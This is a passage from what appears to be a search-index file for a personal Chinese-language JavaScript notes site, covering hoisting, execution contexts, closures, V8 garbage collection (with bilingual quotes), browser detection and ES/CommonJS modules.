console.log('foo1')\n}\nfoo()\n\nvar foo = function(){\n  console.log('foo2')\n}\n\nfoo()\n// foo1 foo2\n</code></pre> <pre><code>function foo() {\n  console.log('foo1')\n}\nfoo()\n\nfunction foo(){\n  console.log('foo2')\n}\n\nfoo()\n// foo2 foo2\n</code></pre>"},{"location":"JS/execution_context/#_3","title":"\u6267\u884c\u4e0a\u4e0b\u6587","text":"<p>executable code : \u5168\u5c40\u4ee3\u7801 \u51fd\u6570\u4ee3\u7801 eval</p> <p>execution context:</p> <p>execution context stack</p> <p>executable code -&gt; compile -&gt; execution</p> <ul> <li>compile: \u51fd\u6570\u7684\u5b9a\u4e49 \u58f0\u660e \u53d8\u91cf\u7684\u58f0\u660e \u51fd\u6570\u7684\u5f62\u53c2</li> </ul> <pre><code>function foo(a){\n  var b = 2\n  function c {}\n  var d = function(){}\n}\nfoo(1)\n\n// complie phare\nlocalAO = {\n  arguments:{\n    length:1\n  },\n  a: 1,\n  b: undefined,\n  c: reference to function c {},\n  d: undefined\n}\n// execution pharse\nlocalAO = {\n    arguments: {\n    length:1\n  }\n  a: 1,\n  b: 2,\n  c: reference to function c {},\n  d: reference to function expression\n}\n</code></pre> <pre><code>localAO = {\n\n}\nparentAO ={\n\n}\nglobalAO = {\n\n}\nECStack = [\n  globalContext,\n  parentContext,\n  localContext\n]\n</code></pre> <pre><code>var scope = \"global scope\"\nfunction checkscope(){\n  var scope = \"local scope\"\n  return scope\n}\n</code></pre> <p>\u8c03\u7528\u51fd\u6570checkScope\u65f6, \u4e0d\u4f1a\u7acb\u5373\u6267\u884c, \u800c\u662f\u4f1a\u8fdb\u884c\u51c6\u5907\u5de5\u4f5c VO /scope chain/ this</p> <pre><code>ECStack = [\n  globalContext,\n  checkscopeContext\n]\ncheckscopeContext = {\n    [[scope]]:[AO,globalAO],\n    AO: {\n    argument:{\n      length: 0\n    }\n    scope: undefined\n  }\n}\n</code></pre> <p>\u8c03\u7528\u6267\u884c\u9636\u6bb5</p> <pre><code>checkscopeContext = {\n    [[scope]]:[AO,globalAO],\n    AO: {\n    argument:{\n      length: 0\n    }\n    scope: 'local scope'\n  }\n}\n</code></pre>"},{"location":"JS/execution_context/#_4","title":"\u95ed\u5305","text":"<p>\u95ed\u5305 = \u4e0d\u662f\u5728\u5f53\u524d\u4f5c\u7528\u57df(Activation Object),\u4f46\u4ecd\u53ef\u4ee5\u8bbf\u95ee\u7684\u53d8\u91cf</p> <p>\u7406\u8bba\u4e0a\u6765\u8bf4,\u6240\u6709\u51fd\u6570\u90fd\u662f\u95ed\u5305</p> <p>\u5b9e\u8df5\u4e0a\u6765\u8bf4,\u5373\u4f7f\u521b\u5efa\u5b83\u7684\u4e0a\u4e0b\u6587\u5df2\u7ecf\u9500\u6bc1,\u5b83\u4ecd\u7136\u5b58\u5728</p> <p>\u6bd4\u5982\u8bf4\u4e0b\u9762\u4f8b\u5b50\u4e2d\u7684\u53d8\u91cfn</p> <pre><code>function makeAdder(n){\n  function adder(k){\n        return k + n\n  }\n  return adder\n}\n</code></pre> <pre><code>-&gt; const addThree = makeAdder(3)\n// when enter func\nEcsStack = [\n  globalContext.VO,\n  makeAdderContext.AO,\n]\n// after func call\nEcsStack = [\n  globalContext.VO,\n]\n-&gt; addThree(4)\n// when func call\nEcsStack = [\n  globalContext.VO,\n  adderContext.AO,\n]\n// after func call\nEcsStack = [\n  globalContext.VO,\n]\n</code></pre> <p>\u8fd4\u56de\u7684\u5185\u90e8\u51fd\u6570<code>adder</code>\u7ef4\u62a4\u4e86\u4e00\u4e2a\u4f5c\u7528\u57df\u94fe</p> <pre><code>addThree(4)\nadderContext = {\n  Scope: [AO, makeAdderContext.AO, globalContext.VO]\n}\n</code></pre> <p>\u56e0\u4e3a\u8fd9\u4e2a\u4f5c\u7528\u57df\u94fe,<code>adder</code>\u51fd\u6570\u4f9d\u7136\u53ef\u4ee5\u8bfb\u53d6\u5230<code>makeAdderContext.AO</code>\u4e2d\u53d8\u91cf\u7ed1\u5b9a\u7684\u503c,\u5f53\u5728<code>adder</code>\u51fd\u6570\u5185\u90e8\u5f15\u7528\u4e86<code>makeAdderContext.AO</code>\u4e2d\u7684\u503c,\u5373\u4f7f<code>makeAdderContext</code>\u88ab\u9500\u6bc1\u4e86,\u4f46\u662fJS\u4f9d\u7136\u4f1a\u8ba9<code>makeAdderContext.AO</code>\u6d3b\u5728\u5185\u5b58\u4e2d, <code>adder</code>\u51fd\u6570\u4f9d\u7136\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u4f5c\u7528\u57df\u94fe\u627e\u5230\u5b83,\u6b63\u662f\u56e0\u4e3aJS\u505a\u5230\u8fd9\u70b9,\u4ece\u800c\u5b9e\u73b0\u4e86\u95ed\u5305</p> <p>\u5b9e\u8df5\u89d2\u5ea6\u4e0a\u7684\u95ed\u5305</p> <ol> <li>\u5373\u4f7f\u521b\u5efa\u5b83\u7684\u4e0a\u4e0b\u6587\u5df2\u7ecf\u9500\u6bc1,\u5b83\u4ecd\u7136\u5b58\u5728(\u5185\u90e8\u51fd\u6570\u4ece\u7236\u51fd\u6570\u8fd4\u56de)</li> <li>\u5728\u5185\u90e8\u51fd\u6570\u4e2d\u5f15\u7528\u4e86\u7236\u51fd\u6570\u4e2d\u7684\u53d8\u91cf</li> </ol> <p>\u200b</p>"},{"location":"JS/functional_programming/","title":"\u51fd\u6570\u5f0f\u7f16\u7a0b","text":"<p>\u51fd\u6570\u4f5c\u4e3a\u4e00\u7b49\u516c\u6c11(function as first citizen)</p> <ul> <li>chainable</li> <li>composable</li> </ul>"},{"location":"JS/garbage_collection/","title":"\u5783\u573e\u56de\u6536","text":"<p># \u5783\u573e\u56de\u6536 engine - Blink:[\"Google Chrome\", \"Microsoft Edge\",\"Opera\",\"Samsung Internet\"] - Gecko: \"Mozilla Firefox\" - WebKit: \"Apple Safari\"</p> <p></p> <p>codeName(\u4ee3\u53f7)</p> <p>TurboFan(\u6da1\u8f6e\u53d1\u52a8),</p> <p>Ignition(\u70b9\u706b\u88c5\u7f6e)</p> <p>Liftoff(\u8d77\u98de)</p> <p>Orinoco(\u5965\u91cc\u8bfa\u79d1\u6cb3derived from Guarauno words meaning \u201ca place to paddle\u201d\u2014i.e., a navigable place. (\u53ef\u4ee5\u901a\u822a\u7684\u5730\u65b9)</p> <p>major  GC-Orinoco(\u5965\u91cc\u8bfa\u79d1\u6cb3): sequential, stop-the-world garbage collector</p> <p>minor of GC - scavenger(\u98df\u8150\u52a8\u7269):  parallel and concurre,incremental fallback</p> <p>name origin</p> <p>V8\u7684\u540d\u5b57\u6765\u6e90\u4e8e\u6c7d\u8f66\u7684\u201cV\u578b8\u7f38\u53d1\u52a8\u673a\u201d\uff08V8\u53d1\u52a8\u673a\uff09.V8\u5f15\u64ce\u7684\u547d\u540d\u662fGoogle\u5411\u7528\u6237\u5c55\u793a\u5b83\u662f\u4e00\u6b3e\u5f3a\u529b\u5e76\u4e14\u9ad8\u901f\u7684JavaScript\u5f15\u64ce</p>"},{"location":"JS/garbage_collection/#major-gc","title":"major GC","text":"<p>The major GC collects garbage from the entire heap. \u4e3b\u8981 GC \u4ece\u6574\u4e2a\u5806\u4e2d\u6536\u96c6\u5783\u573e\u3002</p> <p>Perceptions of Garbage Collection</p> <p></p> <p>Any garbage collector has a few essential tasks that it has to do periodically: \u4efb\u4f55\u5783\u573e\u6536\u96c6\u5668\u90fd\u6709\u4e00\u4e9b\u5fc5\u987b\u5b9a\u671f\u6267\u884c\u7684\u57fa\u672c\u4efb\u52a1\uff1a</p> <ol> <li>Identify live/dead objects    \u8bc6\u522b\u6d3b/\u6b7b\u7269\u4f53</li> <li>Recycle/reuse the memory occupied by dead objects    \u56de\u6536/\u91cd\u7528\u6b7b\u5bf9\u8c61\u5360\u7528\u7684\u5185\u5b58</li> <li>Compact/defragment memory (optional)    \u538b\u7f29/\u788e\u7247\u6574\u7406\u5185\u5b58\uff08\u53ef\u9009\uff09</li> </ol> <p>These tasks can be performed in sequence or can be arbitrarily interleaved. A straight-forward approach is to pause JavaScript execution and perform each of these tasks in sequence on the main thread. This can cause jank and latency issues on the main thread, which we\u2019ve talked about in previous blog posts, as well as reduced program throughput. \u8fd9\u4e9b\u4efb\u52a1\u53ef\u4ee5\u6309\u987a\u5e8f\u6267\u884c\uff0c\u4e5f\u53ef\u4ee5\u4efb\u610f\u4ea4\u9519\u6267\u884c\u3002\u4e00\u79cd\u76f4\u63a5\u7684\u65b9\u6cd5\u662f\u6682\u505c JavaScript \u6267\u884c\u5e76\u5728\u4e3b\u7ebf\u7a0b\u4e0a\u6309\u987a\u5e8f\u6267\u884c\u6bcf\u4e2a\u4efb\u52a1\u3002\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e3b\u7ebf\u7a0b\u51fa\u73b0\u5361\u987f\u548c\u5ef6\u8fdf\u95ee\u9898\uff08\u6211\u4eec\u5728\u4e4b\u524d\u7684\u535a\u5ba2\u6587\u7ae0\u4e2d\u5df2\u7ecf\u8ba8\u8bba\u8fc7\uff09\uff0c\u5e76\u964d\u4f4e\u7a0b\u5e8f\u541e\u5410\u91cf</p>"},{"location":"JS/garbage_collection/#marking","title":"Marking \u6807\u8bb0","text":"<p>Figuring out which objects can be collected is an essential part of garbage collection. Garbage collectors do this by using reachability as a proxy for \u2018liveness\u2019. This means that any object currently reachable within the runtime must be kept, and any unreachable objects may be collected. \u5f04\u6e05\u695a\u54ea\u4e9b\u5bf9\u8c61\u53ef\u4ee5\u88ab\u6536\u96c6\u662f\u5783\u573e\u6536\u96c6\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002\u5783\u573e\u6536\u96c6\u5668\u901a\u8fc7\u4f7f\u7528\u53ef\u8fbe\u6027\u4f5c\u4e3a\u201c\u6d3b\u8dc3\u5ea6\u201d\u7684\u4ee3\u7406\u6765\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u8fd9\u610f\u5473\u7740\u5fc5\u987b\u4fdd\u7559\u8fd0\u884c\u65f6\u4e2d\u5f53\u524d\u53ef\u5230\u8fbe\u7684\u4efb\u4f55\u5bf9\u8c61\uff0c\u5e76\u4e14\u53ef\u4ee5\u6536\u96c6\u4efb\u4f55\u4e0d\u53ef\u5230\u8fbe\u7684\u5bf9\u8c61</p>"},{"location":"JS/garbage_collection/#sweeping","title":"Sweeping \u626b\u5730","text":"<p>Sweeping is a process where gaps in memory left by dead objects are added to a data structure called a free-list. Once marking has completed, the GC finds contiguous gaps left by unreachable objects and adds them to the appropriate free-list. Free-lists are separated by the size of the memory chunk for quick lookup. In the future when we want to allocate memory, we just look at the free-list and find an appropriately sized chunk of memory. \u6e05\u7406\u662f\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u5176\u4e2d\u6b7b\u5bf9\u8c61\u7559\u4e0b\u7684\u5185\u5b58\u95f4\u9699\u88ab\u6dfb\u52a0\u5230\u79f0\u4e3a\u7a7a\u95f2\u5217\u8868\u7684\u6570\u636e\u7ed3\u6784\u4e2d\u3002\u6807\u8bb0\u5b8c\u6210\u540e\uff0cGC \u4f1a\u627e\u5230\u65e0\u6cd5\u8bbf\u95ee\u7684\u5bf9\u8c61\u7559\u4e0b\u7684\u8fde\u7eed\u95f4\u9699\uff0c\u5e76\u5c06\u5b83\u4eec\u6dfb\u52a0\u5230\u9002\u5f53\u7684\u7a7a\u95f2\u5217\u8868\u4e2d\u3002\u7a7a\u95f2\u5217\u8868\u6309\u5185\u5b58\u5757\u7684\u5927\u5c0f\u5206\u9694\uff0c\u4ee5\u4fbf\u5feb\u901f\u67e5\u627e\u3002\u5c06\u6765\u5f53\u6211\u4eec\u60f3\u8981\u5206\u914d\u5185\u5b58\u65f6\uff0c\u6211\u4eec\u53ea\u9700\u67e5\u770b\u7a7a\u95f2\u5217\u8868\u5e76\u627e\u5230\u9002\u5f53\u5927\u5c0f\u7684\u5185\u5b58\u5757\u5373\u53ef\u3002</p>"},{"location":"JS/garbage_collection/#compaction","title":"Compaction \u538b\u5b9e","text":"<p>The major GC also chooses to evacuate/compact some pages, based on a fragmentation heuristic. You can think of compaction sort of like hard-disk defragmentation on an old PC. We copy surviving objects into other pages that are not currently being compacted (using the free-list for that page). This way, we can make use of the small and scattered gaps within the memory left behind by dead objects. \u4e3b\u8981 GC \u8fd8\u6839\u636e\u788e\u7247\u542f\u53d1\u6cd5\u9009\u62e9\u758f\u6563/\u538b\u7f29\u67d0\u4e9b\u9875\u9762\u3002\u60a8\u53ef\u4ee5\u5c06\u538b\u7f29\u60f3\u8c61\u4e3a\u65e7\u7535\u8111\u4e0a\u7684\u786c\u76d8\u788e\u7247\u6574\u7406\u3002\u6211\u4eec\u5c06\u5e78\u5b58\u7684\u5bf9\u8c61\u590d\u5236\u5230\u5f53\u524d\u672a\u538b\u7f29\u7684\u5176\u4ed6\u9875\u9762\u4e2d\uff08\u4f7f\u7528\u8be5\u9875\u9762\u7684\u7a7a\u95f2\u5217\u8868\uff09\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u6b7b\u4ea1\u5bf9\u8c61\u5728\u5185\u5b58\u4e2d\u7559\u4e0b\u7684\u5c0f\u800c\u5206\u6563\u7684\u95f4\u9699\u3002</p> <p>\u4e3b\u8981 GC \u8fd8\u6839\u636e\u788e\u7247\u542f\u53d1\u6cd5\u9009\u62e9\u758f\u6563/\u538b\u7f29\u67d0\u4e9b\u9875\u9762\u3002\u60a8\u53ef\u4ee5\u5c06\u538b\u7f29\u60f3\u8c61\u4e3a\u65e7\u7535\u8111\u4e0a\u7684\u786c\u76d8\u788e\u7247\u6574\u7406\u3002\u6211\u4eec\u5c06\u5e78\u5b58\u7684\u5bf9\u8c61\u590d\u5236\u5230\u5f53\u524d\u672a\u538b\u7f29\u7684\u5176\u4ed6\u9875\u9762\u4e2d\uff08\u4f7f\u7528\u8be5\u9875\u9762\u7684\u7a7a\u95f2\u5217\u8868\uff09\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u6b7b\u4ea1\u5bf9\u8c61\u5728\u5185\u5b58\u4e2d\u7559\u4e0b\u7684\u5c0f\u800c\u5206\u6563\u7684\u95f4\u9699\u3002</p> <p>One potential weakness of a garbage collector which copies surviving objects is that when we allocate a lot of long-living objects, we pay a high cost to copy these objects. This is why we choose to compact only some highly fragmented pages, and just perform sweeping on others, which does not copy surviving objects. \u590d\u5236\u5e78\u5b58\u5bf9\u8c61\u7684\u5783\u573e\u6536\u96c6\u5668\u7684\u4e00\u4e2a\u6f5c\u5728\u5f31\u70b9\u662f\uff0c\u5f53\u6211\u4eec\u5206\u914d\u5927\u91cf\u957f\u671f\u5b58\u5728\u7684\u5bf9\u8c61\u65f6\uff0c\u6211\u4eec\u4f1a\u4ed8\u51fa\u9ad8\u6602\u7684\u6210\u672c\u6765\u590d\u5236\u8fd9\u4e9b\u5bf9\u8c61\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6211\u4eec\u9009\u62e9\u53ea\u538b\u7f29\u4e00\u4e9b\u9ad8\u5ea6\u788e\u7247\u5316\u7684\u9875\u9762\uff0c\u800c\u53ea\u5bf9\u5176\u4ed6\u9875\u9762\u6267\u884c\u626b\u63cf\uff0c\u8fd9\u4e0d\u4f1a\u590d\u5236\u5e78\u5b58\u7684\u5bf9\u8c61</p>"},{"location":"JS/garbage_collection/#gerational-layout","title":"Gerational layout \u5206\u4ee3\u5e03\u5c40","text":"<p>Note</p> <p>\u200b       stack\u5206\u914d\u56fa\u5b9a\u5927\u5c0f\u7684\u503c</p> <p>\u200b       heap\u5206\u914d\u53ef\u53d8\u5927\u5c0f\u7684\u503c</p> <p>The heap in V8 is split into different regions called generations. There is a young generation (split further into \u2018nursery\u2019 and \u2018intermediate\u2019 sub-generations), and an old generation. Objects are first allocated into the nursery. If they survive the next GC, they remain in the young generation but are considered \u2018intermediate\u2019. If they survive yet another GC, they are moved into the old generation. V8 \u4e2d\u7684\u5806\u88ab\u5206\u4e3a\u4e0d\u540c\u7684\u533a\u57df\uff0c\u79f0\u4e3a\u4ee3\u3002\u6709\u5e74\u8f7b\u4e00\u4ee3\uff08\u8fdb\u4e00\u6b65\u5206\u4e3a\u201c\u5e7c\u513f\u201d\u548c\u201c\u4e2d\u95f4\u201d\u5b50\u4ee3\uff09\u548c\u8001\u4e00\u4ee3\u3002\u5bf9\u8c61\u9996\u5148\u88ab\u5206\u914d\u5230\u6258\u513f\u6240\u4e2d\u3002\u5982\u679c\u5b83\u4eec\u5728\u4e0b\u4e00\u6b21 GC \u4e2d\u5e78\u5b58\u4e0b\u6765\uff0c\u5b83\u4eec\u4ecd\u4fdd\u7559\u5728\u5e74\u8f7b\u4ee3\u4e2d\uff0c\u4f46\u88ab\u89c6\u4e3a\u201c\u4e2d\u95f4\u201d\u3002\u5982\u679c\u5b83\u4eec\u5728\u53e6\u4e00\u6b21 GC \u4e2d\u5e78\u5b58\u4e0b\u6765\uff0c\u5b83\u4eec\u5c31\u4f1a\u88ab\u79fb\u5165\u8001\u5e74\u4ee3\u3002</p> <p></p> <p>In garbage collection there is an important term: \u201cThe Generational Hypothesis\u201d. This basically states that most objects die young. In other words, most objects are allocated and then almost immediately become unreachable, from the perspective of the GC. This holds not only for V8 or JavaScript, but for most dynamic languages. \u5728\u5783\u573e\u6536\u96c6\u4e2d\u6709\u4e00\u4e2a\u91cd\u8981\u7684\u672f\u8bed\uff1a\u201c\u4e16\u4ee3\u5047\u8bbe\u201d\u3002\u8fd9\u57fa\u672c\u4e0a\u8868\u660e\u5927\u591a\u6570\u7269\u4f53\u90fd\u4f1a\u5728\u5e74\u8f7b\u65f6\u6b7b\u4ea1\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u4ece GC \u7684\u89d2\u5ea6\u6765\u770b\uff0c\u5927\u591a\u6570\u5bf9\u8c61\u88ab\u5206\u914d\u540e\u51e0\u4e4e\u7acb\u5373\u53d8\u5f97\u4e0d\u53ef\u8bbf\u95ee\u3002\u8fd9\u4e0d\u4ec5\u9002\u7528\u4e8e V8 \u6216 JavaScript\uff0c\u4e5f\u9002\u7528\u4e8e\u5927\u591a\u6570\u52a8\u6001\u8bed\u8a00\u3002</p> <p>V8\u2019s generational heap layout is designed to exploit this fact about object lifetimes. The GC is a compacting/moving GC, which means that it copies objects which survive garbage collection. This seems counterintuitive: copying objects is expensive at GC time. But we know that only a very small percentage of objects actually survive a garbage collection, according to the generational hypothesis. By moving only the objects which survive, every other allocation becomes \u2018implicit\u2019 garbage. This means that we only pay a cost (for copying) proportional to the number of surviving objects, not the number of allocations. V8 \u7684\u5206\u4ee3\u5806\u5e03\u5c40\u65e8\u5728\u5229\u7528\u6709\u5173\u5bf9\u8c61\u751f\u547d\u5468\u671f\u7684\u8fd9\u4e00\u4e8b\u5b9e\u3002 GC \u662f\u538b\u7f29/\u79fb\u52a8 GC\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4f1a\u590d\u5236\u5728\u5783\u573e\u56de\u6536\u4e2d\u5e78\u5b58\u4e0b\u6765\u7684\u5bf9\u8c61\u3002\u8fd9\u4f3c\u4e4e\u8fdd\u53cd\u76f4\u89c9\uff1a\u5728 GC \u65f6\u590d\u5236\u5bf9\u8c61\u7684\u6210\u672c\u5f88\u9ad8\u3002\u4f46\u6211\u4eec\u77e5\u9053\uff0c\u6839\u636e\u5206\u4ee3\u5047\u8bbe\uff0c\u53ea\u6709\u6781\u5c0f\u6bd4\u4f8b\u7684\u5bf9\u8c61\u5b9e\u9645\u4e0a\u5728\u5783\u573e\u56de\u6536\u4e2d\u5e78\u5b58\u4e0b\u6765\u3002\u901a\u8fc7\u4ec5\u79fb\u52a8\u5e78\u5b58\u7684\u5bf9\u8c61\uff0c\u6240\u6709\u5176\u4ed6\u5206\u914d\u90fd\u4f1a\u53d8\u6210\u201c\u9690\u5f0f\u201d\u5783\u573e\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ea\u9700\u652f\u4ed8\u4e0e\u5e78\u5b58\u5bf9\u8c61\u6570\u91cf\u6210\u6bd4\u4f8b\u7684\u6210\u672c\uff08\u7528\u4e8e\u590d\u5236\uff09\uff0c\u800c\u4e0d\u662f\u4e0e\u5206\u914d\u6570\u91cf\u6210\u6bd4\u4f8b\u3002</p>"},{"location":"JS/garbage_collection/#minor-gc-scavenger","title":"Minor GC (Scavenger:\u98df\u8150\u52a8\u7269,\u6e05\u9053\u592b)","text":"<p>There are two garbage collectors in V8. The Major GC (Mark-Compact) collects garbage from the whole heap. The Minor GC (Scavenger) collects garbage in the young generation. The major GC is effective at collecting garbage from the whole heap, but the generational hypothesis tells us that newly allocated objects are very likely to need garbage collection. V8 \u4e2d\u6709\u4e24\u4e2a\u5783\u573e\u6536\u96c6\u5668\u3002 Major GC\uff08Mark-Compact\uff09\u4ece\u6574\u4e2a\u5806\u4e2d\u6536\u96c6\u5783\u573e\u3002 Minor GC\uff08Scavenger\uff09\u6536\u96c6\u5e74\u8f7b\u4ee3\u4e2d\u7684\u5783\u573e\u3002 Major GC \u53ef\u4ee5\u6709\u6548\u5730\u4ece\u6574\u4e2a\u5806\u4e2d\u6536\u96c6\u5783\u573e\uff0c\u4f46\u5206\u4ee3\u5047\u8bbe\u544a\u8bc9\u6211\u4eec\uff0c\u65b0\u5206\u914d\u7684\u5bf9\u8c61\u5f88\u53ef\u80fd\u9700\u8981\u5783\u573e\u6536\u96c6</p> <p>The evacuation step moves all surviving objects to a contiguous chunk of memory (within a page). This has the advantage of completing removing fragmentation - gaps left by dead objects. We then switch around the two spaces i.e. To-Space becomes From-Space and vice-versa. Once GC is completed, new allocations happen at the next free address in the From-Space. \u758f\u6563\u6b65\u9aa4\u5c06\u6240\u6709\u5e78\u5b58\u7684\u5bf9\u8c61\u79fb\u52a8\u5230\u8fde\u7eed\u7684\u5185\u5b58\u5757\uff08\u5728\u4e00\u4e2a\u9875\u9762\u5185\uff09\u3002\u8fd9\u6837\u505a\u7684\u4f18\u70b9\u662f\u53ef\u4ee5\u5b8c\u6210\u6d88\u9664\u788e\u7247\u2014\u2014\u6b7b\u5bf9\u8c61\u7559\u4e0b\u7684\u95f4\u9699\u3002\u7136\u540e\u6211\u4eec\u5207\u6362\u4e24\u4e2a\u7a7a\u95f4\uff0c\u5373\u201cTo-Space\u201d\u53d8\u4e3a\u201cFrom-Space\u201d\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002\u4e00\u65e6 GC \u5b8c\u6210\uff0c\u65b0\u7684\u5206\u914d\u5c31\u4f1a\u53d1\u751f\u5728 From-Space \u4e2d\u7684\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5730\u5740\u3002</p> <p>In the Scavenger, which only collects within the young generation, surviving objects are always evacuated to a new page. V8 uses a \u2018semi-space\u2019 design for the young generation. This means that half of the total space is always empty, to allow for this evacuation step. During a scavenge, this initially-empty area is called \u2018To-Space\u2019. The area we copy from is called \u2018From-Space\u2019. In the worst case, every object could survive the scavenge and we would need to copy every object. \u5728 Scavenger \u4e2d\uff0c\u5b83\u53ea\u5728\u5e74\u8f7b\u4ee3\u4e2d\u8fdb\u884c\u6536\u96c6\uff0c\u5e78\u5b58\u7684\u5bf9\u8c61\u603b\u662f\u88ab\u758f\u6563\u5230\u65b0\u7684\u9875\u9762\u3002 V8\u91c7\u7528\u4e86\u9002\u5408\u5e74\u8f7b\u4e00\u4ee3\u7684\u201c\u534a\u7a7a\u95f4\u201d\u8bbe\u8ba1\u3002\u8fd9\u610f\u5473\u7740\u603b\u7a7a\u95f4\u7684\u4e00\u534a\u59cb\u7ec8\u662f\u7a7a\u7684\uff0c\u4ee5\u5141\u8bb8\u6267\u884c\u6b64\u758f\u6563\u6b65\u9aa4\u3002\u5728\u6e05\u7406\u8fc7\u7a0b\u4e2d\uff0c\u8fd9\u4e2a\u6700\u521d\u662f\u7a7a\u7684\u533a\u57df\u88ab\u79f0\u4e3a\u201c\u5230\u592a\u7a7a\u201d\u3002\u6211\u4eec\u590d\u5236\u7684\u533a\u57df\u79f0\u4e3a\u201cFrom-Space\u201d\u3002\u5728\u6700\u574f\u7684\u60c5\u51b5\u4e0b\uff0c\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u53ef\u4ee5\u5728\u6e05\u7406\u4e2d\u5e78\u5b58\u4e0b\u6765\uff0c\u6211\u4eec\u9700\u8981\u590d\u5236\u6bcf\u4e2a\u5bf9\u8c61\u3002</p> The scavenger evacuates survive objects to a fresh page. <p>We quickly run out of space in the young generation with this strategy alone. Objects that survive a second GC are evacuated into the old generation, rather than To-Space. \u4ec5\u9760\u8fd9\u4e00\u7b56\u7565\uff0c\u6211\u4eec\u5f88\u5feb\u5c31\u4f1a\u8017\u5c3d\u5e74\u8f7b\u4e00\u4ee3\u7684\u7a7a\u95f4\u3002\u5728\u7b2c\u4e8c\u6b21 GC \u4e2d\u5e78\u5b58\u4e0b\u6765\u7684\u5bf9\u8c61\u5c06\u88ab\u758f\u6563\u5230\u8001\u5e74\u4ee3\uff0c\u800c\u4e0d\u662f To-Space\u3002</p> The scavenger evacuates \u2018intermediate\u2019 objects to the old generation, and \u2018nursery\u2019 objects to a fresh page. <p>One important metric for measuring the time spent in garbage collection is the amount of time that the main thread spends paused while GC is performed. For traditional \u2018stop-the-world\u2019 garbage collectors, this time can really add up, and this time spent doing GC directly detracts from the user experience in the form of janky pages and poor rendering and latency</p> <p>\u8861\u91cf\u5783\u573e\u6536\u96c6\u6240\u7528\u65f6\u95f4\u7684\u4e00\u9879\u91cd\u8981\u6307\u6807\u662f\u6267\u884c GC \u65f6\u4e3b\u7ebf\u7a0b\u6682\u505c\u7684\u65f6\u95f4\u91cf\u3002\u5bf9\u4e8e\u4f20\u7edf\u7684\u201cstop-the-world\u201d\u5783\u573e\u6536\u96c6\u5668\u6765\u8bf4\uff0c\u8fd9\u4e2a\u65f6\u95f4\u786e\u5b9e\u4f1a\u589e\u52a0\uff0c\u800c\u4e14\u82b1\u5728 GC \u4e0a\u7684\u65f6\u95f4\u4f1a\u4ee5\u5361\u987f\u9875\u9762\u3001\u7cdf\u7cd5\u7684\u6e32\u67d3\u548c\u5ef6\u8fdf\u7684\u5f62\u5f0f\u76f4\u63a5\u964d\u4f4e\u7528\u6237\u4f53\u9a8c\u3002</p>"},{"location":"JS/garbage_collection/#idle-time-gc","title":"Idle-time GC(\u7a7a\u95f2\u65f6\u5783\u573e\u56de\u6536)","text":"<p>at 60 frames per second, the browser has approximately 16.6 ms to render each frame of an animation. If the animation work is completed early, Chrome can choose to run some of these idle tasks that the GC has created in the spare time before the next frame.</p> Idle GC makes use of free time on the main thread to perform GC work proactively. <ul> <li><code>First-fit</code>\uff0c\u627e\u5230\u5927\u4e8e\u7b49\u4e8e <code>size</code> \u7684\u5757\u7acb\u5373\u8fd4\u56de</li> <li><code>Best-fit</code>\uff0c\u904d\u5386\u6574\u4e2a\u7a7a\u95f2\u5217\u8868\uff0c\u8fd4\u56de\u5927\u4e8e\u7b49\u4e8e <code>size</code> \u7684\u6700\u5c0f\u5206\u5757</li> <li><code>Worst-fit</code>\uff0c\u904d\u5386\u6574\u4e2a\u7a7a\u95f2\u5217\u8868\uff0c\u627e\u5230\u6700\u5927\u7684\u5206\u5757\uff0c\u7136\u540e\u5207\u6210\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206 <code>size</code> \u5927\u5c0f\uff0c\u5e76\u5c06\u8be5\u90e8\u5206\u8fd4\u56de</li> </ul> <ol> <li> <p>Trash talk: the Orinoco garbage collector \u21a9</p> </li> <li> <p>Orinoco: young generation garbage collection  \u21a9</p> </li> </ol>"},{"location":"JS/layout/","title":"Layout","text":""},{"location":"JS/layout/#_1","title":"\u8f6e\u64ad\u56fe","text":""},{"location":"JS/layout/#_2","title":"\u7011\u5e03\u6d41","text":""},{"location":"JS/misc/","title":"Misc","text":""},{"location":"JS/misc/#browser-compatiability","title":"browser compatiability","text":"<pre><code> var userAgent   = navigator.userAgent;\n         var opera       = (userAgent.indexOf('Opera') != -1);\n         var ie          = (userAgent.indexOf('MSIE') != -1);\n         var gecko       = (userAgent.indexOf('Gecko') != -1);\n         var netscape    = (userAgent.indexOf('Mozilla') != -1);\n         var version     = navigator.appVersion;\n</code></pre>"},{"location":"JS/module/","title":"Module","text":""},{"location":"JS/module/#a-backgound-on-modules","title":"a backgound on modules","text":"<p>split into separate module that can be imported as we need One reason why ES6 introduced its own module format is to enable a static structure,</p> <p>Benefit: dead code elimination during bundling</p> <p>In frontend development, modules are usually handled as follows:</p> <pre><code>During development, code exists as many, often small, modules.\nFor deployment, these modules are bundled into a few, relatively large, files.\n</code></pre> <p>The reasons for bundling are:</p> <pre><code>Fewer files need to be retrieved in order to load all modules.\nCompressing the bundled file is slightly more efficient than compressing separate files.\nDuring bundling, unused exports can be removed, potentially resulting in significant space savings.\n</code></pre>"},{"location":"JS/module/#cjsesm","title":"cjs\u548cesm\u6df7\u5408\u5f00\u53d1","text":""},{"location":"JS/module/#esm-only","title":"esm only","text":"<p>__filename, __dirname\u65e0\u6cd5\u4f7f\u7528 <pre><code>{\n  \"type\": \"module\"\n}\n</code></pre> <pre><code>import path from \"node:path\"\nimport {fileURLToPath} from 'node:url'\n\nconst __filename = fileURLToPath(import.meta.url)\nconst __dirname = __filename.slice(0,__filename.lastIndexOf(\"/\"))\nconst pkgPath = path.resolve(__dirname, \"./package.json\")\n</code></pre></p>"},{"location":"JS/module/#cjs-only","title":"cjs only","text":"<pre><code>{\n  \"type\": \"commonjs\"\n}\n</code></pre>"},{"location":"JS/module/#import-and-export-statements","title":"import and export 